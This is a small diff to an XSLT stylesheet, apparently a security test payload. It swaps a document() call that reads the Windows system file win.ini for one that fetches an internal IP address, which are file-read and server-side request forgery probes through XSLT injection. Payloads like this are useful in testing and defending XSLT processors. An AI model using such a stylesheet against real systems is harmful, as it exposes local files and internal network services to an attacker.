@@ -4,7 +4,7 @@
 
 <xsl:template match="/">
   <output>
-    <xsl:value-of select="document('file:///C:/Windows/win.ini')"/>
+    <xsl:value-of select="document('http://10.113.142.31/')"/>
   </output>
 </xsl:template>
 
